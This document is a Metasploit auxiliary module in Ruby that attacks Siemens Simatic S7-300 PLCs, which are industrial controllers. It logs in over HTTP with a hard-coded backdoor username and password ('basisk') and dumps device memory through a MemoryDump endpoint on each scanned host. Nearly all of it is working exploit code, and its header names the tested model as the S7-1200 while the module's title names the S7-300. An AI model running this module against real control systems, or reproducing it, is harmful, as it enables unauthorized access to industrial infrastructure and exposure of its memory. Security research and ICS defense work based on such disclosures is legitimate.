# Date: 7-13-2012
# Exploit Author: Dillon Beresford
# Vendor Homepage: http://www.siemens.com/
# Tested on: Siemens Simatic S7-1200 PLC
# CVE : None
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Auxiliary
   
    include Msf::Exploit::Remote::HttpClient
    include Msf::Auxiliary::Scanner
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;        => &#039;Siemens Simatic S7-300 PLC Remote Memory Viewer&#039;,
            &#039;Description&#039; => %q{ This module attempts to authenticate using a hard-coded backdoor password in
                               the Simatic S7-300 PLC and dumps the device memory using system commands.
                               Mode: Values 8, 16 or 32 bit access
                               Valid address areas are:
                               80000000 - 81FFFFFF SD-Ram cached
                               A0000000 - A1FFFFFF SD-Ram uncached
                               A8000000 - A87FFFFF Norflash
                               AFC00000 - AFC7FFFF ED-Ram int. uncached
                               BFE00000 - BFEFFFFD COM-ED-Ram ext.
                               C0000000 - C007FFFF ED-Ram int. cached
                               D0000000 - D0005FFF Scratchpad data int.
                               D4000000 - D4005FFF Scratchpad code int.
                               F0100000 - F018FFFF SPS-Asic 16-Bit access only
                },
              &#039;Author&#039;          => &#039;Dillon Beresford&#039;,
          &#039;License&#039;                 => MSF_LICENSE,
          &#039;References&#039;     =>
                [
                  [ &#039;URL&#039;, &#039;http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-204-01%20S7-300_S7-400.pdf&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-186-01.pdf&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-161-01.pdf&#039; ],
                ],
            &#039;Version&#039;        => &#039;$Revision$&#039;,
          &#039;DisclosureDate&#039; => &#039;June 2011&#039;
          ))
            register_options(
                [
                    Opt::RPORT(8080),
                    OptString.new(&#039;USER&#039;, [ true, &#039;Simatic S7-300 hardcoded username.&#039;, &#039;basisk&#039;]),
                    OptString.new(&#039;PASS&#039;, [ true, &#039;Simatic S7-300 hardcoded password.&#039;, &#039;basisk&#039;]),
                    OptString.new(&#039;MODE&#039;, [ true, &#039;Memory Read Mode (8-bit, 16-bit, 32-bit)&#039;, &#039;32&#039;]),
                    OptString.new(&#039;HEX&#039;, [ true, &#039;Simatic S7-300 memory offset&#039;, &#039;1&#039;]),
                    OptString.new(&#039;OFFSET&#039;, [ true, &#039;Simatic S7-300 memory offset&#039;]),
                    OptString.new(&#039;LENGTH&#039;, [ true, &#039;Memory Dump Length in Bits&#039;, &#039;256&#039;])
            ], self.class)
    end
 
    def run_host(ip)
         
        begin
            user = datastore[&#039;USER&#039;]
            pass = datastore[&#039;PASS&#039;]
             
            print_status("Attempting to connect to #{rhost}:#{rport}")
            len = &#039;1024&#039;
            login = send_request_raw(
                {
                    &#039;method&#039;    => &#039;GET&#039;,
                    &#039;uri&#039;   => "/login?User="+user+"&Password="+pass
                })
 
 
            if (login)
         
            request = send_request_raw(
                {
                    &#039;method&#039;  => &#039;GET&#039;,
                    &#039;uri&#039;     => "/tools/MemoryDump?Address="+datastore[&#039;OFFSET&#039;]+"&"+"Hex="+datastore[&#039;HEX&#039;]+"&"+"Length="+datastore[&#039;LENGTH&#039;]+"&Mode="+ datastore[&#039;MODE&#039;]
                })
                if (request and request.code == 200)
 
                print_good("Success! Dumping Memory on #{rhost} \r\n\n#{request.body}")
                elsif (request and request.code)
                    print_error("Attempt #HTTP error #{request.code} on #{rhost}")
                end
            end
     
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        rescue ::Timeout::Error, ::Errno::EPIPE
        rescue ::LocalJumpError
        end
    end
end



